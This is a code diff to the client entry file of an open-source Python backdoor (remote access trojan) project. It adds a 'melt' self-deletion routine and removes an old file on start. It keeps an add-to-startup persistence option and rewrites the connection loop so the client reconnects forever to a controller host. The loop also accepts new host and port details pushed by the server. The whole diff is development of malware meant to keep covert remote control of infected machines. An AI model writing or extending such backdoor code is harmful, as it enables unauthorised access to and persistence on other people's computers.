@@ -8,6 +8,7 @@ license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 import socket
 import os
 import sys
+import traceback
 
 # make sure working dir is same as file dir
 os.chdir(os.path.dirname(os.path.abspath(__file__)))
@@ -19,6 +20,8 @@ from src.args import Args
 from src import errors, helper
 
 from src.definitions import platforms
+
+from src.client.persistence.persistence import melt
 
 if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
     from src.client.persistence.unix import Unix as Persistence
@@ -42,19 +45,27 @@ from src import logger
 
 
 class MainClient:
-    def __init__(self, host, port, is_host_name=False, add_to_startup=False, melt=False):
+    def __init__(self, host, port, add_to_startup=False, _melt=False):
         self._args = Args(self)
         logger.init(self._args.get_args())
 
+        # delete old file if there is one to remove
+        rm = self._args.get_args().rm
+        if rm and os.path.isfile(rm):
+            try:
+                os.remove(rm)
+            except Exception:
+                pass
+
         self.client = None
-        self.host = socket.gethostbyname(host) if is_host_name else host
+        self.host = socket.gethostbyname(host)
         self.port = port
 
         p = Persistence()
 
         try:
-            if melt:
-                p.melt()
+            if _melt:
+                melt()
 
             if add_to_startup:
                 p.add_startup()
@@ -62,17 +73,26 @@ class MainClient:
             pass
 
     def start(self):
-        self.client = Client(self.host, self.port)
+        while True:
+            self.client = Client(self.host, self.port)
 
-        try:
-            self.client.connect()
-        except Exception as e:  # if the server closes without warning or something happens
-            self.client.logger.debug(f"Error occurred, restarting. {e}")
+            try:
+                self.client.connect()
+            except errors.ClientSocket.ChangeConnectionDetails as host:
+                host = str(host).split(":")
+                self.host = socket.gethostbyname(host[0])
+                self.port = int(host[1])
+                del self.client
+            except Exception:  # if the server closes without warning or something happens
+                self.client.logger.debug(f"Error occurred, restarting. {traceback.format_exc()}")
 
-            self.client.es.socket.close()
-            del self.client
-            self.start()
+                try:
+                    self.client.es.socket.close()
+                except Exception:
+                    pass
+
+                del self.client
 
 
 if __name__ == "__main__":
-    MainClient('127.0.0.1', 3003, False, False, False).start()
+    MainClient('127.0.0.1', 3003, False, False).start()
